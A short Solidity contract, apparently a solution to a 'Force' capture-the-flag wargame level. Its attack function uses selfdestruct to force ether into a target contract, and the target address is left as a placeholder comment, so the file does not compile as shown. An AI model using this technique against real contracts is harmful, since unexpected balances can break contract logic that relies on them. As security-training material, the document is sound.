// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceHack {
    
    address payable ogContract = /*your instance address*/;
    
    function attack() public payable {
        require(msg.value > 0); // require that a value is specified

        selfdestruct(ogContract); // this deletes the contract and sends ether to the address specified
    }
}